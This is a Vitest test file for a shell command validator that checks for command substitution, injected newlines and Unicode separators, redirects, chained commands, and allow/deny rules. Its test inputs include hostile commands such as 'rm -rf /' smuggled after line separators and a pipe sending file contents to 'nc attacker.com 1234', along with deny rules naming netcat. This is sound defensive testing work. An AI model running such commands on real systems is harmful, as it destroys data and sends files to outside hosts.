/**
 * Command Validator Tests
 * Tests for Sprint 1: Security & Safety
 */

import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import {
  CommandValidator,
  DEV_WORKFLOW_CONFIG,
  READ_ONLY_CONFIG,
  STRICT_CONFIG,
  setCommandPermissions,
  validateCommand,
} from './command-validator.js'
import {
  detectDangerousCharacters,
  detectRedirects,
  extractSubshells,
  parseCommandSegments,
} from './quote-parser.js'

// ============================================================================
// Quote Parser Tests
// ============================================================================

describe('Quote Parser', () => {
  describe('detectDangerousCharacters', () => {
    it('should detect backticks outside quotes', () => {
      const result = detectDangerousCharacters('echo `whoami`')
      expect(result.found).toBe(true)
      expect(result.type).toBe('backtick')
    })

    it('should detect backticks inside double quotes', () => {
      const result = detectDangerousCharacters('echo "`whoami`"')
      expect(result.found).toBe(true)
      expect(result.type).toBe('backtick')
      expect(result.description).toContain('double quotes')
    })

    it('should NOT detect backticks inside single quotes (safe)', () => {
      const result = detectDangerousCharacters("echo '`whoami`'")
      expect(result.found).toBe(false)
    })

    it('should detect $() command substitution', () => {
      const result = detectDangerousCharacters('echo $(whoami)')
      expect(result.found).toBe(true)
      expect(result.type).toBe('backtick')
      expect(result.character).toBe('$(')
    })

    it('should NOT detect $() inside single quotes', () => {
      const result = detectDangerousCharacters("echo '$(whoami)'")
      expect(result.found).toBe(false)
    })

    it('should detect newlines outside quotes', () => {
      const result = detectDangerousCharacters('echo hello\nrm -rf /')
      expect(result.found).toBe(true)
      expect(result.type).toBe('newline')
    })

    it('should NOT detect newlines inside quotes', () => {
      const result = detectDangerousCharacters('echo "hello\nworld"')
      expect(result.found).toBe(false)
    })

    it('should detect Unicode line separator (U+2028)', () => {
      const result = detectDangerousCharacters('echo hello\u2028rm -rf /')
      expect(result.found).toBe(true)
      expect(result.type).toBe('unicode_separator')
    })

    it('should detect Unicode paragraph separator (U+2029)', () => {
      const result = detectDangerousCharacters('echo hello\u2029rm -rf /')
      expect(result.found).toBe(true)
      expect(result.type).toBe('unicode_separator')
    })

    it('should detect null bytes', () => {
      const result = detectDangerousCharacters('echo hello\0world')
      expect(result.found).toBe(true)
      expect(result.type).toBe('null_byte')
    })

    it('should handle escaped backslashes', () => {
      const result = detectDangerousCharacters('echo \\`not command\\`')
      // Escaped backticks are SAFE - the backslash escapes them
      expect(result.found).toBe(false)
    })

    it('should pass safe commands', () => {
      expect(detectDangerousCharacters('ls -la').found).toBe(false)
      expect(detectDangerousCharacters('cat file.txt').found).toBe(false)
      expect(detectDangerousCharacters("grep 'pattern' file").found).toBe(false)
      expect(detectDangerousCharacters('npm run build').found).toBe(false)
    })
  })

  describe('parseCommandSegments', () => {
    it('should parse single command', () => {
      const segments = parseCommandSegments('ls -la')
      expect(segments).toHaveLength(1)
      expect(segments[0].command).toBe('ls -la')
    })

    it('should parse pipe-separated commands', () => {
      const segments = parseCommandSegments('cat file | grep pattern')
      expect(segments).toHaveLength(2)
      expect(segments[0].command).toBe('cat file')
      expect(segments[0].separator).toBe('|')
      expect(segments[1].command).toBe('grep pattern')
    })

    it('should parse && chained commands', () => {
      const segments = parseCommandSegments('cd dir && npm install')
      expect(segments).toHaveLength(2)
      expect(segments[0].command).toBe('cd dir')
      expect(segments[0].separator).toBe('&&')
      expect(segments[1].command).toBe('npm install')
    })

    it('should parse || chained commands', () => {
      const segments = parseCommandSegments('test -f file || touch file')
      expect(segments).toHaveLength(2)
      expect(segments[0].separator).toBe('||')
    })

    it('should parse ; separated commands', () => {
      const segments = parseCommandSegments('echo hello; echo world')
      expect(segments).toHaveLength(2)
      expect(segments[0].separator).toBe(';')
    })

    it('should NOT split inside single quotes', () => {
      const segments = parseCommandSegments("echo 'hello | world'")
      expect(segments).toHaveLength(1)
      expect(segments[0].command).toBe("echo 'hello | world'")
    })

    it('should NOT split inside double quotes', () => {
      const segments = parseCommandSegments('echo "a && b"')
      expect(segments).toHaveLength(1)
    })

    it('should handle complex chained command', () => {
      const segments = parseCommandSegments('cat file | grep x && echo done || echo failed')
      expect(segments).toHaveLength(4)
    })
  })

  describe('detectRedirects', () => {
    it('should detect output redirect', () => {
      const redirects = detectRedirects('echo hello > file.txt')
      expect(redirects).toContain('>')
    })

    it('should detect append redirect', () => {
      const redirects = detectRedirects('echo hello >> file.txt')
      expect(redirects).toContain('>>')
    })

    it('should detect input redirect', () => {
      const redirects = detectRedirects('cat < input.txt')
      expect(redirects).toContain('<')
    })

    it('should NOT detect redirects inside quotes', () => {
      const redirects = detectRedirects("echo 'hello > world'")
      expect(redirects).toHaveLength(0)
    })

    it('should detect stderr redirect', () => {
      const redirects = detectRedirects('command 2> errors.log')
      expect(redirects).toContain('2>')
    })
  })

  describe('extractSubshells', () => {
    it('should extract $() subshells', () => {
      const subshells = extractSubshells('echo $(whoami)')
      expect(subshells).toContain('whoami')
    })

    it('should extract nested subshells', () => {
      const subshells = extractSubshells('echo $(echo $(pwd))')
      // Note: extracts outer first
      expect(subshells.length).toBeGreaterThan(0)
    })

    it('should NOT extract from single quotes', () => {
      const subshells = extractSubshells("echo '$(whoami)'")
      expect(subshells).toHaveLength(0)
    })
  })
})

// ============================================================================
// Command Validator Tests
// ============================================================================

describe('CommandValidator', () => {
  describe('Basic validation', () => {
    it('should allow commands when no config', () => {
      const validator = new CommandValidator(undefined)
      const result = validator.validate('rm -rf /')
      expect(result.allowed).toBe(true)
      expect(result.reason).toBe('no_config')
    })

    it('should reject empty commands', () => {
      const validator = new CommandValidator()
      const result = validator.validate('')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('empty_command')
    })

    it('should reject whitespace-only commands', () => {
      const validator = new CommandValidator()
      const result = validator.validate('   ')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('empty_command')
    })
  })

  describe('Dangerous character detection', () => {
    it('should block backticks', () => {
      const validator = new CommandValidator({ allow: ['*'] })
      const result = validator.validate('echo `whoami`')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('dangerous_char_detected')
    })

    it('should block $() substitution', () => {
      const validator = new CommandValidator({ allow: ['*'] })
      const result = validator.validate('echo $(id)')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('dangerous_char_detected')
    })

    it('should block unicode separators', () => {
      const validator = new CommandValidator({ allow: ['*'] })
      const result = validator.validate('echo hi\u2028rm -rf /')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('dangerous_char_detected')
    })
  })

  describe('Allow/Deny patterns', () => {
    it('should match allow patterns', () => {
      const validator = new CommandValidator({
        allow: ['ls *', 'cat *'],
      })

      expect(validator.validate('ls -la').allowed).toBe(true)
      expect(validator.validate('cat file.txt').allowed).toBe(true)
      expect(validator.validate('rm file.txt').allowed).toBe(false)
    })

    it('should deny takes precedence over allow', () => {
      const validator = new CommandValidator({
        allow: ['rm *'],
        deny: ['rm -rf *'],
      })

      expect(validator.validate('rm file.txt').allowed).toBe(true)
      expect(validator.validate('rm -rf /').allowed).toBe(false)
    })

    it('should support glob wildcards', () => {
      const validator = new CommandValidator({
        allow: ['npm *', 'git *'],
      })

      expect(validator.validate('npm install').allowed).toBe(true)
      expect(validator.validate('npm run build').allowed).toBe(true)
      expect(validator.validate('git commit -m "test"').allowed).toBe(true)
    })
  })

  describe('Chained command validation', () => {
    it('should validate each segment of piped commands', () => {
      const validator = new CommandValidator({
        allow: ['cat *', 'grep *'],
        deny: ['nc *'],
      })

      // Safe pipe
      expect(validator.validate('cat file | grep pattern').allowed).toBe(true)

      // Dangerous: cat is allowed, but nc is denied
      const result = validator.validate('cat file | nc attacker.com 1234')
      expect(result.allowed).toBe(false)
      expect(result.failedSegment).toBe('nc attacker.com 1234')
    })

    it('should validate && chained commands', () => {
      const validator = new CommandValidator({
        allow: ['npm *', 'echo *'],
        deny: ['rm *'],
      })

      expect(validator.validate('npm install && echo done').allowed).toBe(true)
      expect(validator.validate('npm install && rm -rf node_modules').allowed).toBe(false)
    })

    it('should validate || chained commands', () => {
      const validator = new CommandValidator({
        allow: ['test *', 'mkdir *'],
        deny: ['rm *'],
      })

      expect(validator.validate('test -d dir || mkdir dir').allowed).toBe(true)
      expect(validator.validate('test -d dir || rm -rf /').allowed).toBe(false)
    })

    it('should validate complex chains', () => {
      const validator = new CommandValidator({
        allow: ['cat *', 'grep *', 'wc *'],
      })

      const result = validator.validate('cat file | grep pattern | wc -l')
      expect(result.allowed).toBe(true)
    })
  })

  describe('Redirect handling', () => {
    it('should block redirects when allowRedirects is false', () => {
      const validator = new CommandValidator({
        allow: ['echo *'],
        allowRedirects: false,
      })

      const result = validator.validate('echo hello > file.txt')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('redirect_detected')
    })

    it('should allow redirects when allowRedirects is true', () => {
      const validator = new CommandValidator({
        allow: ['echo *'],
        allowRedirects: true,
      })

      const result = validator.validate('echo hello > file.txt')
      expect(result.allowed).toBe(true)
    })
  })

  describe('Subshell validation', () => {
    it('should validate subshell contents', () => {
      const validator = new CommandValidator({
        allow: ['echo *', 'pwd'],
      })

      // $() gets caught by dangerous char detection first
      const result = validator.validate('echo $(pwd)')
      expect(result.allowed).toBe(false)
      expect(result.reason).toBe('dangerous_char_detected')
    })
  })
})

// ============================================================================
// Preset Config Tests
// ============================================================================

describe('Preset Configurations', () => {
  describe('DEV_WORKFLOW_CONFIG', () => {
    let validator: CommandValidator

    beforeEach(() => {
      validator = new CommandValidator(DEV_WORKFLOW_CONFIG)
    })

    it('should allow common dev commands', () => {
      expect(validator.validate('npm install').allowed).toBe(true)
      expect(validator.validate('git status').allowed).toBe(true)
      expect(validator.validate('node script.js').allowed).toBe(true)
      expect(validator.validate('ls -la').allowed).toBe(true)
    })

    it('should block dangerous commands', () => {
      expect(validator.validate('rm -rf /').allowed).toBe(false)
      expect(validator.validate('sudo rm file').allowed).toBe(false)
    })

    it('should allow redirects', () => {
      expect(validator.validate('echo test > file.txt').allowed).toBe(true)
    })
  })

  describe('READ_ONLY_CONFIG', () => {
    let validator: CommandValidator

    beforeEach(() => {
      validator = new CommandValidator(READ_ONLY_CONFIG)
    })

    it('should allow read commands', () => {
      expect(validator.validate('cat file.txt').allowed).toBe(true)
      expect(validator.validate('ls -la').allowed).toBe(true)
      expect(validator.validate('grep pattern file').allowed).toBe(true)
      expect(validator.validate('git status').allowed).toBe(true)
    })

    it('should block write commands', () => {
      expect(validator.validate('npm install').allowed).toBe(false)
      expect(validator.validate('touch file').allowed).toBe(false)
    })

    it('should block redirects', () => {
      expect(validator.validate('echo test > file').allowed).toBe(false)
    })
  })

  describe('STRICT_CONFIG', () => {
    let validator: CommandValidator

    beforeEach(() => {
      validator = new CommandValidator(STRICT_CONFIG)
    })

    it('should only allow exact commands in allow list', () => {
      // STRICT_CONFIG only allows specific commands (no wildcards)
      expect(validator.validate('pwd').allowed).toBe(true)
      expect(validator.validate('whoami').allowed).toBe(true)
      expect(validator.validate('date').allowed).toBe(true)
      expect(validator.validate('ls').allowed).toBe(true)
      expect(validator.validate('git status').allowed).toBe(true)
    })

    it('should block commands not in allow list', () => {
      // Commands not exactly matching are rejected
      expect(validator.validate('ls -la').allowed).toBe(false) // 'ls' allowed, not 'ls -la'
      expect(validator.validate('cat file').allowed).toBe(false)
      expect(validator.validate('rm -rf /').allowed).toBe(false)
      expect(validator.validate('git push').allowed).toBe(false) // only 'git status' allowed
    })

    it('should block redirects', () => {
      expect(validator.validate('pwd > out.txt').allowed).toBe(false)
    })
  })
})

// ============================================================================
// Global API Tests
// ============================================================================

describe('Global API', () => {
  afterEach(() => {
    // Reset global config
    setCommandPermissions(null)
  })

  it('should use global validator', () => {
    setCommandPermissions({
      deny: ['rm *'],
    })

    const result = validateCommand('rm -rf /')
    expect(result.allowed).toBe(false)
  })

  it('should allow when no global config', () => {
    setCommandPermissions(null)
    const result = validateCommand('anything')
    expect(result.allowed).toBe(true)
    expect(result.reason).toBe('no_config')
  })
})
